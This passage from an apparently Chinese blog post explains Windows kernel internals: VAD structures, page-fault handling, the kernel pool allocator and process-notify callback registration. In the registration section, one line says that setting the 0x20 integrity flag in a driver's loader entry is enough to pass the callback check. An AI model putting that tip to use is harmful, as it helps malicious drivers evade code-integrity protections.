class="keyword">struct</span> _<span class="title">MMVAD_FLAGS</span> <span class="title">VadFlags</span>;</span>                                       <span class="comment">//0x30 📌</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MM_PRIVATE_VAD_FLAGS</span> <span class="title">PrivateVadFlags</span>;</span>                       <span class="comment">//0x30</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MM_GRAPHICS_VAD_FLAGS</span> <span class="title">GraphicsVadFlags</span>;</span>                     <span class="comment">//0x30</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MM_SHARED_VAD_FLAGS</span> <span class="title">SharedVadFlags</span>;</span>                         <span class="comment">//0x30</span></span><br><span class="line">        <span class="keyword">volatile</span> ULONG VolatileVadLong;                                     <span class="comment">//0x30</span></span><br><span class="line">    &#125; u;                                                                    <span class="comment">//0x30</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LongFlags1;                                                   <span class="comment">//0x34</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS1</span> <span class="title">VadFlags1</span>;</span>                                     <span class="comment">//0x34</span></span><br><span class="line">    &#125; u1;                                                                   <span class="comment">//0x34</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_EVENT_BLOCK</span>* <span class="title">EventList</span>;</span>                                  <span class="comment">//0x38 用于处理某些内存事件</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h4 id="MMVAD-FLAGS"><a href="#MMVAD-FLAGS" class="headerlink" title="MMVAD_FLAGS"></a>MMVAD_FLAGS</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x4 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Lock:<span class="number">1</span>;                                                           <span class="comment">//0x0 内存被 VirtualLock 锁定了</span></span><br><span class="line">    ULONG LockContended:<span class="number">1</span>;                                                  <span class="comment">//0x0 锁竞争标志</span></span><br><span class="line">    ULONG DeleteInProgress:<span class="number">1</span>;                                               <span class="comment">//0x0 正在删除中</span></span><br><span class="line">    ULONG NoChange:<span class="number">1</span>;                                                       <span class="comment">//0x0 禁止修改保护属性</span></span><br><span class="line">    ULONG VadType:<span class="number">3</span>;                                                        <span class="comment">//0x0 📌VAD 类型：</span></span><br><span class="line">                                            <span class="comment">// 0 = Private (私有)</span></span><br><span class="line">                                                                            <span class="comment">// 1 = Mapped (文件映射)</span></span><br><span class="line">                                                                            <span class="comment">// 2 = Image (可执行文件/DLL)</span></span><br><span class="line">    ULONG Protection:<span class="number">5</span>;                                                     <span class="comment">//0x0 📌内存保护属性 (R/W/X)</span></span><br><span class="line">    ULONG PreferredNode:<span class="number">6</span>;                                                  <span class="comment">//0x0 </span></span><br><span class="line">    ULONG PageSize:<span class="number">2</span>;                                                       <span class="comment">//0x0 是否是大页 (Large Page)</span></span><br><span class="line">    ULONG PrivateMemory:<span class="number">1</span>;                                                  <span class="comment">//0x0 📌1 = 私有内存 (Commit), 0 = 映射对象</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h4 id="MMVAD"><a href="#MMVAD" class="headerlink" title="MMVAD"></a>MMVAD</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x88 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span> <span class="title">Core</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG LongFlags2;                                                   <span class="comment">//0x40</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS2</span> <span class="title">VadFlags2</span>;</span>                            <span class="comment">//0x40</span></span><br><span class="line">    &#125; u2;                                                                   <span class="comment">//0x40</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SUBSECTION</span>* <span class="title">Subsection</span>;</span>                                         <span class="comment">//0x48 指向文件映射的核心控制块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span>* <span class="title">FirstPrototypePte</span>;</span>                                       <span class="comment">//0x50 📌原型 PTE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span>* <span class="title">LastContiguousPte</span>;</span>                                       <span class="comment">//0x58</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ViewLinks</span>;</span>                                           <span class="comment">//0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span>* <span class="title">VadsProcess</span>;</span>                                          <span class="comment">//0x70 📌指回所属进程</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_SEQUENTIAL_INFO</span> <span class="title">SequentialVa</span>;</span>                        <span class="comment">//0x78</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">MMEXTEND_INFO</span>* <span class="title">ExtendedInfo</span>;</span>                                <span class="comment">//0x78</span></span><br><span class="line">    &#125; u4;                                                                   <span class="comment">//0x78 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">FILE_OBJECT</span>* <span class="title">FileObject</span>;</span>                                        <span class="comment">//0x80 如果是文件映射，这里持有文件对象指针</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>MMVAD结构体包含MMVAD_SHORT包含MMVAD_FLAGS</p><p><code>EPROCESS-&gt;VadRoot</code>类型是 <code>_RTL_AVL_TREE</code>，<code>_RTL_AVL_TREE</code> 只有一个成员：<code>Root</code> (类型是 <code>_RTL_BALANCED_NODE*</code>)，就是二叉树的 <code>node</code>节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _RTL_BALANCED_NODE</span><br><span class="line">nt!_RTL_BALANCED_NODE</span><br><span class="line">   +0x000 Children         : [2] Ptr64 _RTL_BALANCED_NODE</span><br><span class="line">   +0x000 Left             : Ptr64 _RTL_BALANCED_NODE</span><br><span class="line">   +0x008 Right            : Ptr64 _RTL_BALANCED_NODE</span><br><span class="line">   +0x010 Red              : Pos 0, 1 Bit</span><br><span class="line">   +0x010 Balance          : Pos 0, 2 Bits</span><br><span class="line">   +0x010 ParentValue      : Uint8B</span><br></pre></td></tr></table></figure><p>当前节点 ：覆盖范围是 <code>[StartingVpn, EndingVpn]</code>。(Virtual Page Number)</p><p>左子树 ：所有 VPN 小于 <code>StartingVpn</code> 的内存块。</p><p>右子树 ：所有 VPN 大于 <code>EndingVpn</code> 的内存块。</p><p>起始页：<code>startingVpn*0x1000</code> 结束页:<code>EndVpn*0x1000+0xfff</code></p><p>私有内存：通过 VirtualAlloc&#x2F;VirtualAllocEx 申请的</p><p>映射内存：通过 CreateFileMapping 映射的</p><p>通过IDA跟踪 malloc 和 new 的调用过程，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc</span><br><span class="line">new -&gt; _nh_malloc -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc</span><br></pre></td></tr></table></figure><p>堆其实就是操作系统通过调用 VirtualAlloc 函数预先分配好的一大块以4KB为单位的内存。 HeapAlloc 的作用就是在这一大块已经预先分配好的内存里面，分一些小份出来用。</p><h3 id="缺页异常"><a href="#缺页异常" class="headerlink" title="缺页异常"></a>缺页异常</h3><p>VirtualAlloc分配内存到缺页异常分配实际物理页</p><p>Allocation Phase</p><ol><li><code>VirtualAlloc</code> -&gt; <code>NtAllocateVirtualMemory</code> -&gt; <code>MiAllocateVirtualMemory</code>。</li><li><code>MiReserveUserMemory</code> -&gt; <code>MiInsertVad</code>。<ul><li><code>ExAllocatePoolMm</code>从内核池（Paged Pool）分配 64 字节，创建一个空的 <code>_MMVAD_SHORT</code> 结构体</li><li>遍历VAD 树插入节点。</li><li>PTE 状态 ：对应范围的 PTE 保持为 Demand Zero 格式（P&#x3D;0，PageFileHigh&#x3D;0，Protection&#x3D;非空）。</li></ul></li></ol><p>Page Fault</p><ol><li>触发 ：用户访问 VA（Virtual Address）</li><li>入口 ：<code>KiPageFault</code>读取 <code>CR2</code> 寄存器（故障地址）</li><li>分发 ：<code>MmAccessFault</code> -&gt;<code>MiDispatchFault</code>。检查 PTE，发现 <code>Valid=0</code>，判定为 Demand Zero，调用 <code>MiResolveDemandZeroFault</code></li><li>VAD 验证：进入 <code>MiResolveDemandZeroFault</code> 。调用  <code>MiLocateAddress(FaultingAddr)</code> 。这步优先检查VAD Hint（最近访问缓存），再在 VAD 树中查找（从 <code>EPROCESS</code>拿到的指针）。如果返回 NULL，则异常处理失败。</li><li>物理页获取： <code>MiResolvePrivateZeroFault</code> 内部调用 <code>MiGetPageChain</code>，从 <code>mmZeroedPageListHead</code> 或 <code>mmFreePageListHead</code>摘取物理页 PFN。</li><li>修补页表 ：<code>MiResolvePrivateZeroFault</code> 最后调用  <code>MiCompletePrivateZeroFault</code> ，该函数计算 <code>PTE_Address</code>，将新申请的 <code>PFN</code> 物理页号和 <code>Valid=1</code> 以及保护属性写入该地址。更新 PFN 数据库（<code>_MMPFN</code>）中的 <code>PteAddress</code> 指向该 PTE。</li></ol><h3 id="池分配器"><a href="#池分配器" class="headerlink" title="池分配器"></a>池分配器</h3><h4 id="POOL-HEADER"><a href="#POOL-HEADER" class="headerlink" title="POOL_HEADER"></a>POOL_HEADER</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _POOL_HEADER</span><br><span class="line">nt!_POOL_HEADER</span><br><span class="line">   +0x000 PreviousSize     : Pos 0, 8 Bits  // 前一个块的大小</span><br><span class="line">   +0x000 PoolIndex        : Pos 8, 8 Bits  // 池索引</span><br><span class="line">   +0x002 BlockSize        : Pos 0, 8 Bits  // 当前块的大小 (包含 Header)</span><br><span class="line">   +0x002 PoolType         : Pos 8, 8 Bits  // 池类型 (NonPaged, Paged 等)</span><br><span class="line">   +0x000 Ulong1           : Uint4B</span><br><span class="line">   +0x004 PoolTag          : Uint4B         // 4字节标签</span><br><span class="line">   +0x008 ProcessBilled    : Ptr64 _EPROCESS //指向分配的进程的KPROCESS指针,只有在PoolType中设置了PoolQuota,才会被设置</span><br><span class="line">   +0x008 AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +0x00a PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure><p>与用户层使用的堆一样,段堆根据分配的大小提供不同的功能,定义了4个后端.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">低碎片堆</span><br><span class="line">– Low Fragmentation Heap (abbr LFH): RtlpHpLfhContextAllocate</span><br><span class="line">可变量大小后端</span><br><span class="line">– Variable Size (abbr VS): RtlpHpVsContextAllocateInternal</span><br><span class="line">分段分配</span><br><span class="line">– Segment Alloc (abbr Seg): RtlpHpSegAlloc</span><br><span class="line">大型分配</span><br><span class="line">– Large Alloc: RtlpHpLargeAlloc</span><br></pre></td></tr></table></figure><p>请求分配的大小与选择后端的映射关系如下图所示</p><p><img src="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20230822151821128.png" alt="image-20230822151821128"></p><p>LFH用户态下没有 Chunk Header，完全依赖 <code>_HEAP_LFH_SUBSEGMENT</code> 中的 <code>BlockBitmap</code>来记录哪个块被分配了。</p><p>内核态下有 <code>POOL_HEADER</code>，内核需要 <code>Tag</code> (用于 <code>!poolused</code> 统计) 和 <code>PoolType</code> (用于判断是非分页还是分页)。</p><p>VS结构 <code>VS Header</code> + <code>POOL_HEADER</code> + <code>Driver Data</code>。</p><p>NonPagedPool (非分页池)</p><ul><li>定义 ：物理页永远驻留在 RAM 中，绝不会被交换（Swap&#x2F;Page Out）到磁盘上的 <code>pagefile.sys</code>。</li><li>底层 ：分配的虚拟地址对应的 PTE (页表项) 中的  Valid (V) 位始终为 1 。</li></ul><p>PagedPool (分页池)</p><ul><li>定义 ：物理页可以被内存管理器回收并写入磁盘。当你一段时间不访问它，RAM 里的物理页就被拿去给别人用了。</li><li>底层 ：当你访问已被换出的 PagedPool 时，CPU 硬件触发 缺页异常 (#PF) 。内核的缺页处理程序（<code>KiPageFault</code> -&gt; <code>MmAccessFault</code>）会去磁盘读取数据，重新分配物理页，修补 PTE，然后让你继续执行。</li></ul><p>NUMA(Non-Uniform Memory Access非一致性内存访问)</p><p>系统将 CPU 和内存划分成多个  节点 (Node) 。每个 CPU 都有自己“私有”的一块内存（本地节点）。CPU 访问这块内存速度非常快 。</p><h4 id="ExPoolState"><a href="#ExPoolState" class="headerlink" title="ExPoolState"></a>ExPoolState</h4><p>是一个全局变量，它是整个内核池系统的根对象。</p><h5 id="EX-POOL-HEAP-MANAGER-STATE"><a href="#EX-POOL-HEAP-MANAGER-STATE" class="headerlink" title="EX_POOL_HEAP_MANAGER_STATE"></a>EX_POOL_HEAP_MANAGER_STATE</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_EX_POOL_HEAP_MANAGER_STATE</span><br><span class="line">   +0x000 HeapManager      : _RTLP_HP_HEAP_MANAGER  // 通用堆管理器状态 (Bitmap, 全局锁等)</span><br><span class="line">   +0x38d0 NumberOfPools    : Uint4B  // 当前系统启用的池数量</span><br><span class="line">   +0x3900 PoolNode         : [64] _EX_HEAP_POOL_NODE  // NUMA 节点数组</span><br><span class="line">   +0x86900 SpecialHeaps     : [4] Ptr64 _SEGMENT_HEAP // 特殊用途堆 (通常是 Session)</span><br></pre></td></tr></table></figure><h5 id="EX-HEAP-POOL-NODE"><a href="#EX-HEAP-POOL-NODE" class="headerlink" title="EX_HEAP_POOL_NODE"></a>EX_HEAP_POOL_NODE</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EX_HEAP_POOL_NODE</span><br><span class="line">nt!_EX_HEAP_POOL_NODE</span><br><span class="line">   +0x000 Heaps            : [4] Ptr64 _SEGMENT_HEAP  // 0 = NonPaged, 1 = NonPagedNx, 2 = Paged, 3 = PagedSession</span><br><span class="line">   +0x040 Lookasides       : [2] _RTL_DYNAMIC_LOOKASIDE  // 用于管理延迟释放的链表</span><br></pre></td></tr></table></figure><h4 id="ExAllocatePool2简化流程"><a href="#ExAllocatePool2简化流程" class="headerlink" title="ExAllocatePool2简化流程"></a>ExAllocatePool2简化流程</h4><p><code>ExAllocatePool2 -&gt; ExpAllocatePoolWithTagFromNode</code></p><p>标志转换 : <code>POOL_FLAGS</code> (如 <code>POOL_FLAG_NON_PAGED</code>) <strong>$\rightarrow$</strong> <code>POOL_TYPE</code> (0, 1, 512…)。</p><p>读取 <code>KeGetCurrentPrcb()-&gt;ParentNode</code> 获取当前  <strong>NodeIndex</strong> 。</p><p><code>ExAllocateHeapPool</code></p><ul><li><strong>寻址逻辑</strong> :</li></ul><p>$$<br>\text{HeapPtr} &#x3D; \text{nt!ExPoolState.PoolNode}[\text{NodeIndex}].\text{Heaps}[\text{PoolType}]<br>$$</p><ul><li><strong>结果</strong> : 拿到一个具体的 <code>_SEGMENT_HEAP*</code> 指针。</li></ul><p><code>RtlpHpAllocateHeap</code></p><p>拿到 <code>_SEGMENT_HEAP</code> 后，根据 <code>Size</code> 进入以下决策树（这是你需要修正的地方）：</p><ol><li>一级缓存: Dynamic Lookaside (动态快表)<ul><li>范围 : 通常覆盖中等大小 (e.g., 512B - 3KB, 动态调整)。</li><li>位置 : <code>_SEGMENT_HEAP.UserContext</code> -&gt; <code>_RTL_DYNAMIC_LOOKASIDE</code>。</li><li>动作 : 检查单链表 (<code>SLIST</code>)。如果有空闲块， 原子操作弹出 (Pop) ，直接返回。</li></ul></li><li>二级分配: LFH (低碎片堆)<ul><li>范围 : 1B - 16,368B (16KB，0x3FF0)。</li><li>位置 : <code>_SEGMENT_HEAP.LfhContext</code>。</li><li>动作 : 计算 Bucket Index <strong>$\rightarrow$</strong> 扫描 <code>BlockBitmap</code> <strong>$\rightarrow$</strong> 找到空闲位 <strong>$\rightarrow$</strong> 置位并返回。</li></ul></li><li>三级分配: VS (可变大小)<ul><li>范围 : 16KB - 128KB (通常上限)。</li><li>位置 : <code>_SEGMENT_HEAP.VsContext</code>。</li><li>动作 : 搜索 <code>RB-Tree</code> (红黑树) 或空闲链表，进行切割 (Split) 或合并 (Coalesce)。</li></ul></li><li>四级分配: Segment&#x2F;Large Alloc<ul><li>范围 : &gt; 128KB。</li><li>动作 : 调用 <code>RtlpHpSegAlloc</code> 或 <code>RtlpHpLargeAlloc</code>，直接向内存管理器 (<code>Mm</code>) 申请独立的 VAD&#x2F;PTE。</li></ul></li></ol><h2 id="内核回调"><a href="#内核回调" class="headerlink" title="内核回调"></a>内核回调</h2><h3 id="系统通知型回调（Notify-Callbacks）"><a href="#系统通知型回调（Notify-Callbacks）" class="headerlink" title="系统通知型回调（Notify Callbacks）"></a>系统通知型回调（Notify Callbacks）</h3><h4 id="进程回调"><a href="#进程回调" class="headerlink" title="进程回调"></a>进程回调</h4><p>Windows 提供两种进程回调机制：</p><p><code>PCREATE_PROCESS_NOTIFY_ROUTINE</code>（基础版）</p><p><code>PCREATE_PROCESS_NOTIFY_ROUTINE</code> 类型的回调需要通过 <code>PsSetCreateProcessNotifyRoutine</code> 函数注册和移除 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">PsSetCreateProcessNotifyRoutine</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,  <span class="comment">// 回调函数，当进程创建或销毁时会被调用</span></span></span><br><span class="line"><span class="params">    _In_ BOOLEAN Remove                                    <span class="comment">// 布尔值，TRUE 表示移除回调函数，FALSE 表示注册回调</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>可以提供进程的 PID、父进程 ID 和创建&#x2F;销毁事件标志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef VOID (*PCREATE_PROCESS_NOTIFY_ROUTINE)(</span><br><span class="line">    _In_ HANDLE ParentId,   // 父进程 PID</span><br><span class="line">    _In_ HANDLE ProcessId,  // 当前进程 PID</span><br><span class="line">    _In_ BOOLEAN Create     // TRUE 表示创建进程，FALSE 表示退出进程</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>PCREATE_PROCESS_NOTIFY_ROUTINE_EX</code>（扩展版）</p><p><code>PCREATE_PROCESS_NOTIFY_ROUTINE_EX</code> 回调函数是通过 <code>PsSetCreateProcessNotifyRoutineEx</code> 函数注册或删除的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTKERNELAPI </span><br><span class="line">NTSTATUS </span><br><span class="line"><span class="title function_">PsSetCreateProcessNotifyRoutineEx</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,  <span class="comment">// 扩展回调函数，提供更多的进程上下文信息</span></span></span><br><span class="line"><span class="params">    _In_ BOOLEAN Remove                                        <span class="comment">// 布尔值，TRUE 表示移除回调，FALSE 表示注册回调</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>提供更丰富的进程创建上下文，包括 <code>EPROCESS</code> 指针、映像路径、命令行、映像对象等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span> <span class="params">(*PCREATE_PROCESS_NOTIFY_ROUTINE_EX)</span><span class="params">(</span></span><br><span class="line"><span class="params">    _Inout_ PEPROCESS Process,             <span class="comment">// 进程对象的指针，包含详细的进程信息</span></span></span><br><span class="line"><span class="params">    _In_ HANDLE ProcessId,                 <span class="comment">// 目标进程的 ID</span></span></span><br><span class="line"><span class="params">    _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo <span class="comment">// 额外的创建通知信息（如命令行等）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>额外的信息结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_CREATE_NOTIFY_INFO</span> &#123;</span></span><br><span class="line">    _In_ SIZE_T Size;                                     <span class="comment">// 0x00: 结构体大小，必须初始化为 sizeof(PS_CREATE_NOTIFY_INFO)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        _In_ ULONG Flags;                                 <span class="comment">// 0x04: 进程创建特性标志位集合</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            _In_ ULONG FileOpenNameAvailable : <span class="number">1</span>;         <span class="comment">// bit0: 当设置为1时表示ImageFileName字段包含有效的映像文件名</span></span><br><span class="line">            _In_ ULONG IsSubsystemProcess : <span class="number">1</span>;            <span class="comment">// bit1: 当设置为1时表示该进程是子系统进程（如Win32子系统进程）</span></span><br><span class="line">            _In_ ULONG Reserved : <span class="number">30</span>;                     <span class="comment">// bit2-31: 保留位，必须设置为0，供系统将来使用</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    _In_ HANDLE ParentProcessId;                          <span class="comment">// 0x08: 父进程的进程ID（PID），标识创建此进程的父进程</span></span><br><span class="line">    _In_ CLIENT_ID CreatingThreadId;                      <span class="comment">// 0x0C: 创建此进程的线程ID（包含进程ID和线程ID的结构体）</span></span><br><span class="line">    _Inout_ <span class="class"><span class="keyword">struct</span> _<span class="title">FILE_OBJECT</span> *<span class="title">FileObject</span>;</span>              <span class="comment">// 0x14: 指向进程映像文件对象的指针，可用于文件重定向</span></span><br><span class="line">    _In_ PCUNICODE_STRING ImageFileName;                  <span class="comment">// 0x18: 指向进程映像文件完整路径的指针（NT路径格式）</span></span><br><span class="line">    _In_opt_ PCUNICODE_STRING CommandLine;                <span class="comment">// 0x1C: 指向进程命令行参数的指针（可选字段，在较新版本的 Windows 10/11 上才存在，低版本系统或某些子系统进程（如 csrss.exe）中会为 NULL）</span></span><br><span class="line">    _Inout_ NTSTATUS CreationStatus;                      <span class="comment">// 0x20: 进程创建状态码，驱动程序可修改此值来阻止进程创建</span></span><br><span class="line">&#125; PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;</span><br></pre></td></tr></table></figure><h5 id="注册过程"><a href="#注册过程" class="headerlink" title="注册过程"></a>注册过程</h5><p>都会调用 <code>PspSetCreateProcessNotifyRoutine</code>函数</p><p><code>MmVerifyCallbackFunctionCheckFlags</code>验证该地址是否属于已加载的驱动模块</p><p><code>MiLookupDataTableEntry</code>会从全局变量 <code>nt!MmLoadedModuleTable</code> 指向的根节点出发，按照二叉搜索逻辑遍历隐藏在每个驱动结构体 +0xE8 处的 <code>BaseAddressIndexNode</code>（红黑树节点）。在遍历过程中，它通过指针偏移计算出当前节点的驱动内存范围（<code>DllBase</code> 至 <code>DllBase + Size</code>），若目标地址落在该范围内则命中，最后将节点地址减去 <code>0xE8</code> 还原得到 <code>_KLDR_DATA_TABLE_ENTRY</code> 的首地址。</p><p>同时对于扩展回调注册，会检查 <code>KLDR_DATA_TABLE_ENTRY</code> 的 Flags 字段是否是 <code>0x20</code>，<code>0x20</code> 对应的是 <code>LDRP_IMAGE_INTEGRITY_FORCED</code>，因此使其 <code>0x20</code> 置位即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">7: kd&gt; dt _KLDR_DATA_TABLE_ENTRY</span><br><span class="line">nt!_KLDR_DATA_TABLE_ENTRY</span><br><span class="line">   +0x000 InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +0x010 ExceptionTable   : Ptr64 Void</span><br><span class="line">   +0x018 ExceptionTableSize : Uint4B</span><br><span class="line">   +0x020 GpValue          : Ptr64 Void</span><br><span class="line">   +0x028 NonPagedDebugInfo : Ptr64 _NON_PAGED_DEBUG_INFO</span><br><span class="line">   +0x030 DllBase          : Ptr64 Void</span><br><span class="line">   +0x038 EntryPoint       : Ptr64 Void</span><br><span class="line">   +0x040 SizeOfImage      : Uint4B</span><br><span class="line">   +0x048 FullDllName      : _UNICODE_STRING</span><br><span class="line">   +0x058 BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +0x068 Flags            : Uint4B</span><br><span class="line">   +0x06c LoadCount        : Uint2B</span><br><span class="line">   +0x06e u1               : &lt;anonymous-tag&gt;</span><br><span class="line">   +0x070 SectionPointer   : Ptr64 Void</span><br><span class="line">   +0x078 CheckSum         : Uint4B</span><br><span class="line">   +0x07c CoverageSectionSize : Uint4B</span><br><span class="line">   +0x080 CoverageSection  : Ptr64 Void</span><br><span class="line">   +0x088 LoadedImports    : Ptr64 Void</span><br><span class="line">   +0x090 Spare            : Ptr64 Void</span><br><span class="line">   +0x098 SizeOfImageNotRounded : Uint4B</span><br><span class="line">   +0x09c TimeDateStamp    : Uint4B</span><br></pre></td></tr></table></figure><p><code>ExAllocateCallBack</code>申请 <code>NonPagedPoolNx</code> (非分页不可执行内存) 24 字节。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span 